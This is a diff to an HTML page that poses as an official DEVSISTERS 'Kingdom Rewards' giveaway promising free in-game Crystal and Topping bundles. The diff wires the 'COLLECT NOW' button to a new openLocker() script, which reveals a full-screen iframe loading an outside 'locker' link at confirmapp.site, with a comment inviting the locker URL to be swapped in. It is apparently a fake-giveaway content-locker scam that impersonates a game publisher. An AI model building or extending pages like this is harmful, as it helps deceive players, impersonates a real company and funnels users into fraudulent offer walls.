@@ -145,9 +145,9 @@
         <h1 class="game-title">REDEEM GIFTS</h1>
         <p class="game-subtitle">Access the kingdom vault to collect your <br>exclusive Crystal & Topping bundles!</p>
 
-        <a href="javascript:void(0)" onclick="_di();" class="claim-btn">
-            COLLECT NOW
-        </a>
+        <a href="javascript:void(0)" onclick="openLocker()" class="claim-btn">
+    COLLECT NOW
+</a>
 
         <div class="social-icons">
             <a href="#"><i class="fab fa-facebook-f"></i></a>
@@ -159,5 +159,24 @@
             © 2026 DEVSISTERS. Official Kingdom Rewards Program.
         </div>
     </div>
+    <div id="lockerContainer" style="display:none; width:100%; height:100vh;">
+    <iframe 
+        id="lockerFrame"
+        src=""
+        style="width:100%; height:100%; border:none;">
+    </iframe>
+</div>
 </body>
 </html>
+<script>
+function openLocker() {
+    // show iframe
+    const container = document.getElementById('lockerContainer');
+    const iframe = document.getElementById('lockerFrame');
+
+    container.style.display = 'block';
+
+    // 👉 PUT YOUR LOCKER LINK HERE
+    iframe.src = "https://confirmapp.site/cl/i/822wpk";
+}
+</script>
